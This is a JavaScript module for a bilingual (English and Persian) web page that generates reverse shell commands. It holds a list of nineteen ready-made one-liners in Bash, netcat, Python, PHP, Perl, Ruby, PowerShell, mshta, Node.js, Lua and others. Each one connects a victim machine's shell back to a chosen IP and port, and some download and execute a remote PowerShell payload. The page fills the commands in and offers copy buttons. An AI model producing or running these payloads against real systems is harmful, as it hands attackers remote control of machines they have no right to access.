const PAYLOADS = [
  { name: 'Bash', tags: ['Linux', 'Mac'], command_template: 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' },
  { name: 'Bash (mkfifo)', tags: ['Linux', 'Mac'], command_template: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f' },
  { name: 'Python', tags: ['Linux', 'Mac'], command_template: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${shell}","-i"])\'' },
  { name: 'Netcat (traditional)', tags: ['Linux', 'Mac'], command_template: 'nc -e ${shell} ${ip} ${port}' },
  { name: 'Netcat (openbsd)', tags: ['Linux', 'Mac'], command_template: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f' },
  { name: 'PHP', tags: ['Linux', 'Mac', 'Windows'], command_template: 'php -r \'$s=fsockopen("${ip}",${port});exec("${shell} -i <&3 >&3 2>&3");\'' },
  { name: 'Perl', tags: ['Linux', 'Mac'], command_template: 'perl -e \'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");}\'' },
  { name: 'Ruby', tags: ['Linux', 'Mac'], command_template: 'ruby -rsocket -e\'f=TCPSocket.open("${ip}",${port});exec("${shell} -i",{0=>f,1=>f,2=>f})\'' },
  { name: 'PowerShell #1', tags: ['Windows'], command_template: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'${ip}\',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
  { name: 'PowerShell #2', tags: ['Windows'], command_template: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'${ip}\',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'# \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
  { name: 'PowerShell (web)', tags: ['Windows'], command_template: 'powershell IEX (New-Object Net.WebClient).DownloadString(\'http://${ip}:${port}/payload.ps1\')' },
  { name: 'Ncat (Windows)', tags: ['Windows'], command_template: 'ncat ${ip} ${port} -e cmd.exe' },
  { name: 'Mshta', tags: ['Windows'], command_template: 'mshta vbscript:CreateObject("Wscript.Shell").Run("cmd.exe /c powershell -c IEX(New-Object Net.WebClient).downloadString(\'http://${ip}:${port}/payload.ps1\')")(window.close)' },
  { name: 'Java', tags: ['Linux', 'Mac', 'Windows'], command_template: 'r = Runtime.getRuntime();p = r.exec(["${shell}","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor()' },
  { name: 'Telnet', tags: ['Linux', 'Mac'], command_template: 'TF=$(mktemp -u);mkfifo $TF;telnet ${ip} ${port}|${shell} -i 2>&1|tee $TF;$TF' },
  { name: 'Socat', tags: ['Linux', 'Mac'], command_template: 'socat exec:\'${shell} -i\',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}' },
  { name: 'Awk', tags: ['Linux', 'Mac'], command_template: 'awk \'BEGIN{s="/inet/tcp/0/${ip}/${port";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}\'' },
  { name: 'Node.js', tags: ['Linux', 'Mac', 'Windows'], command_template: "node -e 'require(\"net\").connect(${port},\"${ip}\",function(){require(\"child_process\").spawn(\"${shell}\",[\"-i\"],{stdio:[this,this,this]})})'" },
  { name: 'Lua', tags: ['Linux', 'Mac'], command_template: "lua5.3 -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"${ip}\",${port});os.execute(\"${shell} -i >&"..t:getfd()..\" 2>&"..t:getfd()..\" <&"..t:getfd().."\")'" },
];

function tagClass(tag) {
  const map = { Linux: 'good', Mac: 'warn', Windows: 'bad' };
  return map[tag] || '';
}

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

export default function render(lang) {
  const isFa = lang === 'fa';
  return `
<div class="panel">
  <div class="grid two">
    <div>
      <label class="label">${isFa ? 'آی‌پی' : 'IP Address'}</label>
      <input class="field" id="rs-ip" type="text" placeholder="10.10.10.10" value="10.10.10.10">
    </div>
    <div>
      <label class="label">${isFa ? 'پورت' : 'Port'}</label>
      <input class="field" id="rs-port" type="number" placeholder="4444" value="4444">
    </div>
  </div>
  <div style="margin-top:12px">
    <label class="label">${isFa ? 'نوع شل' : 'Shell Type'}</label>
    <select class="field" id="rs-shell">
      <option value="/bin/sh">/bin/sh</option>
      <option value="/bin/bash">/bin/bash</option>
      <option value="powershell">powershell</option>
      <option value="cmd">cmd</option>
      <option value="python">python</option>
    </select>
  </div>
</div>
<div class="section-title">${isFa ? 'پیلودهای شل معکوس' : 'Reverse Shell Payloads'}</div>
<div class="table-card">
  <div class="table-scroll">
    <table>
      <thead>
        <tr>
          <th>${isFa ? 'نام' : 'Name'}</th>
          <th>${isFa ? 'برچسب‌ها' : 'Tags'}</th>
          <th>${isFa ? 'دستور' : 'Command'}</th>
          <th></th>
        </tr>
      </thead>
      <tbody id="rs-tbody"></tbody>
    </table>
  </div>
</div>`;
}

export function init(lang) {
  const ipInput = document.getElementById('rs-ip');
  const portInput = document.getElementById('rs-port');
  const shellSelect = document.getElementById('rs-shell');
  const tbody = document.getElementById('rs-tbody');

  function renderTable() {
    const ip = ipInput.value || '10.10.10.10';
    const port = portInput.value || '4444';
    const shell = shellSelect.value || '/bin/sh';
    tbody.innerHTML = PAYLOADS.map(p => {
      const cmd = p.command_template.replace(/\$\{ip\}/g, ip).replace(/\$\{port\}/g, port).replace(/\$\{shell\}/g, shell);
      const tags = p.tags.map(t => `<span class="status ${tagClass(t)}">${t}</span>`).join(' ');
      return `<tr>
        <td><strong>${p.name}</strong></td>
        <td>${tags}</td>
        <td><code>${escapeHtml(cmd)}</code></td>
        <td><button class="secondary-btn" data-copy="${escapeHtml(cmd)}">${lang === 'fa' ? 'کپی' : 'Copy'}</button></td>
      </tr>`;
    }).join('');
  }

  tbody.addEventListener('click', (e) => {
    const btn = e.target.closest('.secondary-btn');
    if (btn) {
      navigator.clipboard.writeText(btn.getAttribute('data-copy'));
    }
  });

  ipInput.addEventListener('input', renderTable);
  portInput.addEventListener('input', renderTable);
  shellSelect.addEventListener('change', renderTable);

  renderTable();
}
